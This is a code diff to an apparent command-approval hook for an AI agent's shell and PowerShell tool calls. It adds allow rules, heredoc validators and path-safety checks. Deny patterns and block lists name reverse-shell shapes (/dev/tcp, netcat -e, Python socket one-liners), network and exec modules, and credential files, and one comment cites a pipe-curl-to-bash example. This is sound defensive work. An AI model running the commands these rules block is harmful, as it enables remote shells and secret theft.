@@ -447,7 +447,7 @@ const DENY_PATTERNS = [
   [/bash\s+-i\s+.*>\/dev\/tcp\//, 'Reverse shell pattern blocked'],
   [/\/dev\/(tcp|udp)\//, 'Direct /dev/tcp or /dev/udp access blocked'],
   [/\b(nc|ncat|netcat|socat)\s+.*-[a-zA-Z]*e\s/i, 'Netcat with -e blocked -- possible reverse shell'],
-  [/python[23]?\s+-c\s+.*\b(socket|pty\.spawn|subprocess)\b/i, 'Python one-liner with socket/pty/subprocess blocked'],
+  [/python[23]?\s+-c\s+.*(\bsocket\b|\bpty\.spawn\b|\bsubprocess\b|\bos\.system\b|\bos\.popen\b|\bos\.exec|\bos\.spawn|\b__import__\b|\bimportlib\b|\beval\s*\(|\bexec\s*\()/i, 'Python one-liner with socket/subprocess/os-exec/eval blocked'],
   [/perl\s+-e\s+.*\bsocket\b/i, 'Perl socket one-liner blocked'],
   [/ruby\s+-e\s+.*\bTCPSocket\b/i, 'Ruby TCPSocket one-liner blocked'],
 
@@ -688,13 +688,17 @@ const APPROVE_PATTERNS = [
 
   // JavaScript / TypeScript tooling
   /^\s*(tsc|eslint|prettier|vitest|jest|mocha|biome|stylelint|tsx|ts-node|swc)\b/,
-  /^\s*(npx|pnpm|yarn|bun)\s+(tsc|eslint|prettier|vitest|jest|mocha|biome|stylelint)\b/,
-  /^\s*pnpm\s+(run|test|build|dev|lint|format|exec|start)\b/,
-  /^\s*bun\s+(run|test|build|dev|x\s+\S+|start)\b/,
-  /^\s*yarn\s+(run|test|build|dev|lint|format|start)\b/,
+  /^\s*(npx|pnpm|yarn|bun)\s+(?:-[A-Za-z]+\s+)*(tsc|eslint|prettier|vitest|jest|mocha|biome|stylelint)\b/,
+  /^\s*pnpm\s+(?:-[A-Za-z]+\s+)*(run|test|build|dev|lint|format|exec|start)\b/,
+  /^\s*bun\s+(?:-[A-Za-z]+\s+)*(run|test|build|dev|x\s+\S+|start)\b/,
+  /^\s*yarn\s+(?:-[A-Za-z]+\s+)*(run|test|build|dev|lint|format|start)\b/,
+  /^\s*npm\s+(?:-[A-Za-z]+\s+)*(run|test|ci)\b/,
 
   // GitHub CLI (read-only)
   /^\s*gh\s+(auth\s+status|repo\s+(view|list)|pr\s+(view|list|status|checks|diff)|issue\s+(view|list|status)|run\s+(view|list|watch)|workflow\s+(view|list)|release\s+(view|list)|api\s+-X\s+GET\b|api\s+\/?[A-Za-z0-9_\/-]+\s*$|search\s+(repos|issues|prs|code|commits|users))\b/,
+  // GitHub CLI (writes) -- common workflow ops. Deny rules still catch the
+  // truly dangerous shapes (push to main, git config identity tamper, etc.).
+  /^\s*gh\s+(pr\s+(create|edit|merge|close|reopen|ready|review|comment|checkout)|issue\s+(create|edit|close|reopen|comment)|release\s+create|workflow\s+run)\b/,
 
   // Kubernetes (read-only)
   /^\s*kubectl\s+(get|describe|logs|explain|top|version|api-resources|api-versions|cluster-info|config\s+(view|current-context|get-contexts|get-clusters|get-users)|auth\s+can-i)\b/,
@@ -740,7 +744,177 @@ const POSH_APPROVE_PATTERNS = [
   /^\s*(Get-Command|gcm|Get-Help|help|Get-Member)\b/i,
   // Read-only git / tool version checks reuse the same shapes as bash.
   /^\s*git\s+(status|log|diff|show|branch|tag|remote|describe|rev-parse|ls-files|blame|reflog)\b/,
+  // Read/write git that POSIX-side already permits -- mirror the bash safe-write list.
+  /^\s*git\s+(-C\s+\S+\s+)?(add|commit|fetch|checkout\s+-b|stash\s+(save|push|pop|apply|drop)|switch|pull|merge|cherry-pick|worktree\s+(list|add|remove)|restore\s+--staged)\b/i,
+  // GitHub CLI -- mirror bash gh read+write rules.
+  /^\s*gh\s+(auth\s+status|repo\s+(view|list)|pr\s+(view|list|status|checks|diff|create|edit|merge|close|reopen|ready|review|comment|checkout)|issue\s+(view|list|status|create|edit|close|reopen|comment)|run\s+(view|list|watch)|workflow\s+(view|list|run)|release\s+(view|list|create)|api\s+-X\s+GET\b|api\s+\/?[A-Za-z0-9_\/-]+\s*$|search\s+(repos|issues|prs|code|commits|users))\b/i,
+  // Narrow Remove-Item: filename-only target (no path separators, no .., no
+  // wildcard), no -Recurse, no -Force. Leading dot is allowed (e.g. dotfiles
+  // like `.pr-body-bump.md`) as long as the second char is alphanumeric -- this
+  // rejects literal `.` and `..`. The negative lookahead rejects sensitive
+  // extensions (dotfiles like `.env` and regular files like `backup.key`); the
+  // list mirrors isSafeRelativePath's so the two surfaces stay in sync. POSH
+  // deny rules already block the dangerous shapes (recurse+force on
+  // home/root/wildcard).
+  /^\s*(?:Remove-Item|ri|rm|del|erase)\s+(?:-LiteralPath\s+|-Path\s+)?(['"]?)(?!\.?\w*\.?(?:env|pem|key|crt|secret|credentials|pgpass|netrc|npmrc|p12|pfx|jks|bashrc|zshrc|profile|gitconfig)\1\s*$)(?!(?:id_rsa|id_ed25519|id_ecdsa|id_dsa|known_hosts|authorized_keys)(?:\.pub)?\1\s*$)\.?[A-Za-z0-9_][A-Za-z0-9_.\-]*\1\s*$/i,
+  // Python / uv tooling on PowerShell -- a SUBSET of the bash approve set. The
+  // broad bash `python <script>` and `python -c <code>` forms are intentionally
+  // NOT mirrored here; only `-m <linter>`, the linters directly, and `uv` verbs.
+  // Deny patterns run first on every segment, so `uv run <x>` is still
+  // backstopped against dangerous substrings.
+  /^\s*python[23]?\s+-m\s+(pytest|unittest|black|ruff|mypy|pylint|isort|flake8|coverage|tox|build|venv|pip\s+(?:list|show|freeze))\b/i,
+  /^\s*pytest\b/i,
+  /^\s*(ruff|black|mypy|pylint|pyright|isort|flake8|bandit|pyflakes|autopep8|yapf|pycodestyle|pydocstyle|pyupgrade)\b/i,
+  /^\s*uv\s+(run|sync|lock|tree|pip\s+(?:list|show|tree))\b/i,
+  // Call operator (&) running python or uv. The path must be either a
+  // project-local venv (.venv\Scripts on Windows, .venv/bin on POSIX) or a
+  // bare name resolved via PATH. An arbitrary absolute or traversed path
+  // (e.g. a planted `C:\tmp\python.exe` or `..\..\python.exe`) is NOT accepted
+  // -- those would run an explicitly-named binary that bypasses PATH trust.
+  // The `(['"]?)...\1` pairs the optional surrounding quote. Arguments are
+  // constrained to read-only module / test / lint verbs.
+  /^\s*&\s+(['"]?)(?:\.[\\\/]\.venv[\\\/](?:Scripts|bin)[\\\/])?python(?:[23])?(?:\.exe)?\1\s+-m\s+(ruff|black|mypy|pytest|pylint|pyright|isort|flake8|bandit|coverage|build|pip\s+(?:list|show|freeze))\b/i,
+  /^\s*&\s+(['"]?)(?:\.[\\\/]\.venv[\\\/](?:Scripts|bin)[\\\/])?uv(?:\.exe)?\1\s+(run|sync|lock|tree|pip\s+(?:list|show|tree))\b/i,
+  // pnpm/yarn/bun/npm under PowerShell (mirror bash JS-tooling rules with flag tolerance).
+  /^\s*pnpm\s+(?:-[A-Za-z]+\s+)*(run|test|build|dev|lint|format|exec|start)\b/i,
+  /^\s*bun\s+(?:-[A-Za-z]+\s+)*(run|test|build|dev|x\s+\S+|start)\b/i,
+  /^\s*yarn\s+(?:-[A-Za-z]+\s+)*(run|test|build|dev|lint|format|start)\b/i,
+  /^\s*npm\s+(?:-[A-Za-z]+\s+)*(run|test|ci)\b/i,
 ];
+
+// Path safety guard reused by heredoc validators. A "safe relative path" is
+// project-local: not absolute, no `..` traversal, no glob, and not a known
+// sensitive file/dir.
+function isSafeRelativePath(p) {
+  if (typeof p !== 'string' || p.length === 0) return false;
+  if (/^[\/\\]/.test(p)) return false;
+  if (/^[A-Za-z]:[\\\/]/.test(p)) return false;
+  if (/^~/.test(p)) return false;
+  if (/(^|[\\\/])\.\.([\\\/]|$)/.test(p)) return false;
+  if (/[*?]/.test(p)) return false;
+  if (/(^|[\\\/])(id_rsa|id_ed25519|id_ecdsa|id_dsa|known_hosts|authorized_keys)(\.pub)?$/i.test(p)) return false;
+  if (/\.(bashrc|zshrc|profile|bash_profile|zprofile|zshenv|zlogin|kshrc|cshrc|inputrc|fishrc|config\.fish|env|pem|key|crt|secret|credentials|pgpass|netrc|npmrc|p12|pfx|jks)$/i.test(p)) return false;
+  if (/(^|[\\\/])\.ssh([\\\/]|$)|(^|[\\\/])\.gnupg([\\\/]|$)|(^|[\\\/])\.aws([\\\/]|$)|(^|[\\\/])\.gcloud([\\\/]|$)|(^|[\\\/])\.azure([\\\/]|$)|(^|[\\\/])\.docker[\\\/]config|(^|[\\\/])\.gitconfig$|(^|[\\\/])\.git-credentials$|(^|[\\\/])\.git[\\\/]hooks([\\\/]|$)/i.test(p)) return false;
+  if (/(^|[\\\/])\.github[\\\/]workflows[\\\/]|\.gitlab-ci\.yml$|(^|[\\\/])\.circleci[\\\/]config|(^|[\\\/])Jenkinsfile$|\.drone\.yml$|\.azure-pipelines\.yml$|\.woodpecker\.yml$|buildkite\.yml$/i.test(p)) return false;
+  return true;
+}
+
+// Conservative Python heredoc body validator. Returns true iff the body is
+// purely data-and-file-write with safe-relative-path targets. Rejects any
+// import or call into subprocess / socket / urllib / requests / shutil /
+// ctypes / paramiko, all os.* mutating methods, and all eval-family builtins.
+// Any open() with a non-literal first arg also rejects (we can't statically
+// prove the path is safe). Comments and string literals can contain arbitrary
+// text -- the patterns require a real Python token boundary.
+function isSafePythonHeredocBody(body) {
+  const unsafe = [
+    // Module imports that grant exec / network / filesystem mutation.
+    /\bimport\s+(?:subprocess|socket|urllib|requests|httpx|aiohttp|websockets|paramiko|fabric|shutil|ctypes|importlib|ftplib|smtplib|telnetlib|xmlrpc|pickle|marshal|pathlib|io|builtins)\b/,
+    /\bfrom\s+(?:subprocess|socket|urllib|requests|httpx|aiohttp|websockets|paramiko|fabric|shutil|ctypes|importlib|ftplib|smtplib|telnetlib|xmlrpc|pickle|marshal|pathlib|io|builtins|http|os|sys)\s+import\b/,
+    // os.* mutating methods (writes, perms, ids, process spawns, fs moves).
+    /\bos\.(?:system|popen|exec[lv]?[ep]?e?|spawn[lv]?[ep]?e?|posix_spawn|fork|forkpty|kill|remove|unlink|rmdir|removedirs|chmod|fchmod|lchmod|chown|fchown|lchown|setuid|setgid|setreuid|setregid|setgroups|putenv|unsetenv|rename|renames|replace|truncate|ftruncate|link|symlink|mkdir|makedirs|open|write|writev|pwrite|pread|sendfile|copy_file_range|mkfifo|mknod|chdir|fchdir|chroot)\b/,
+    // Direct attribute access on dangerous modules even if aliased via import-as.
+    /\b(?:subprocess|socket|urllib|requests|httpx|aiohttp|paramiko|shutil|pathlib|builtins|io)\.[A-Za-z_]/,
+    // Built-in eval-family and reflection that defeat the static checks.
+    /\b(?:eval|exec|__import__|compile|getattr|setattr|delattr|globals|locals|vars|input|breakpoint|memoryview)\s*\(/,
+    // Mutating file/path methods, regardless of receiver (pathlib.Path, file-like, etc.).
+    /\.\s*(?:write_text|write_bytes|touch|symlink_to|hardlink_to|replace|rename|unlink|chmod|rmdir|mkdir|expanduser|expandvars|resolve)\s*\(/,
+    // `Path(...)` construction is the doorway to write_text/write_bytes/etc.; if
+    // the body needs to write a file it can use the literal `open()` form which
+    // we already validate.
+    /\bPath\s*\(/,
+  ];
+  for (const re of unsafe) {
+    if (re.test(body)) return false;
+  }
+  // Triple-quoted open() paths defeat both the literal-string capture (zero
+  // non-quote chars between the opening `"` and the next `"`) and the
+  // non-literal-arg guard (the lookahead sees a quote). Reject explicitly.
+  if (/\bopen\s*\(\s*[rRbBuU]*(?:"""|''')/.test(body)) return false;
+  const openLiteral = /\bopen\s*\(\s*[rRbBuU]*(['"])([^'"]+)\1/g;
+  let m;
+  while ((m = openLiteral.exec(body)) !== null) {
+    if (!isSafeRelativePath(m[2])) return false;
+  }
+  // Any open() whose first arg is NOT a literal quoted string is opaque -- reject.
+  if (/\bopen\s*\(\s*(?![rRbBuU]*['"])/.test(body)) return false;
+  return true;
+}
+
+// Detects a single heredoc invocation (`python3 << 'MARKER' ... MARKER` or
+// `cat|tee REDIRECT << ['"]?MARKER['"]?`) optionally followed by trailing
+// commands that themselves auto-approve. Returns true iff the whole rawCmd is
+// safe to approve as a single decision.
+function isSafeHeredocInvocation(rawCmd) {
+  if (!rawCmd || !rawCmd.includes('<<')) return false;
+  // postMarker (between marker and body's first newline) may carry a single
+  // safe redirection like `> file`, which is the common `cat <<EOF > file` form.
+  const head = rawCmd.match(
+    /^([\s\S]*?)<<(-?)\s*(['"]?)([A-Za-z_]\w*)\3([^\n]*)\n([\s\S]*?)\n([\t]*)\4(?:\r?\n|$)([\s\S]*)$/
+  );
+  if (!head) return false;
+  const preface   = head[1].trim();
+  const dash      = head[2];
+  const quoted    = head[3] === "'" || head[3] === '"';
+  const postMark  = head[5];
+  const body      = head[6];
+  const endPad    = head[7];
+  const trailing  = head[8];
+
+  if (dash === '' && endPad !== '') return false;
+  if (/<<-?\s*['"]?[A-Za-z_]\w*['"]?/.test(trailing)) return false;
+  if (!quoted && /\$\(|`|\$\{|\$[A-Za-z_]/.test(body)) return false;
+
+  let postMarkerTarget = null;
+  if (postMark.trim() !== '') {
+    const redirM = postMark.match(/^\s*>>?\s+(['"]?)([^\s'"<>|;&]+)\1\s*$/);
+    if (!redirM) return false;
+    postMarkerTarget = redirM[2];
+  }
+
+  const tokens = preface.split(/\s+/).filter(Boolean);
+  if (tokens.length === 0) return false;
+  const interp = tokens[0].toLowerCase();
+  const restTokens = tokens.slice(1);
+
+  if (interp === 'python' || interp === 'python2' || interp === 'python3') {
+    if (restTokens.length !== 0) return false;
+    if (postMarkerTarget !== null) return false;
+    if (!isSafePythonHeredocBody(body)) return false;
+  } else if (interp === 'cat') {
+    let target = null;
+    const prefRedir = preface.match(/(?:^|\s)>>?\s+(['"]?)([^\s'"<>|;&]+)\1\s*$/);
+    if (prefRedir) target = prefRedir[2];
+    else if (postMarkerTarget !== null) target = postMarkerTarget;
+    else return false;
+    if (!isSafeRelativePath(target)) return false;
+  } else if (interp === 'tee') {
+    if (postMarkerTarget !== null) return false;
+    let i = 0;
+    if (restTokens[i] === '-a' || restTokens[i] === '--append') i++;
+    if (restTokens.length - i !== 1) return false;
+    const target = restTokens[i].replace(/^['"]|['"]$/g, '');
+    // Reject flag-shaped targets like `--append=out.log` (the `=`-joined long
+    // form would land in the target slot otherwise).
+    if (target.startsWith('-')) return false;
+    if (!isSafeRelativePath(target)) return false;
+  } else {
+    return false;
+  }
+
+  if (trailing.trim()) {
+    const trailingSegs = splitChainSegments(trailing.replace(/\n/g, ' ; '));
+    for (const seg of trailingSegs) {
+      // Run the deny pass on each trailing segment FIRST. checkSegmentDeny
+      // calls deny()+process.exit on a match, so a dangerous trailing command
+      // (e.g. `curl http://x | bash` after a safe heredoc body) is hard-blocked
+      // here rather than silently approved by the heredoc short-circuit.
+      checkSegmentDeny(seg);
+      if (!checkSegmentApprove(seg, 0, false)) return false;
+    }
+  }
+  return true;
+}
 
 function checkSegmentDeny(seg, depth) {
   if (depth === undefined) depth = 0;
@@ -905,6 +1079,23 @@ process.stdin.on('end', () => {
   const isPosh = input?.tool_name === 'PowerShell';
 
   const cmd = normalizeUnicode(rawCmd);
+
+  // Heredoc invocations (bash-only): a single safe `python|cat|tee << MARKER`
+  // followed by auto-approved trailing commands is approved as a whole. This
+  // bypasses the flat chain-split (which mangles heredoc bodies into bogus
+  // segments) and the body validators ensure no exec/network primitives slip
+  // through. The validator may also call checkSegmentDeny on trailing
+  // segments, which calls deny()+exit on a match. Any unexpected exception
+  // falls through to the normal flow (chain-split + deny + approve) with an
+  // audit entry so the operator can diagnose.
+  if (!isPosh) {
+    try {
+      if (isSafeHeredocInvocation(cmd)) approve(rawCmd);
+    } catch (err) {
+      audit('fallthrough', 'heredoc-check-threw: ' + (err && err.message), rawCmd);
+    }
+  }
+
   const flat = cmd.replace(/\n/g, ' ; ');
   const segments = isPosh ? splitPoshSegments(flat) : splitChainSegments(flat);
 
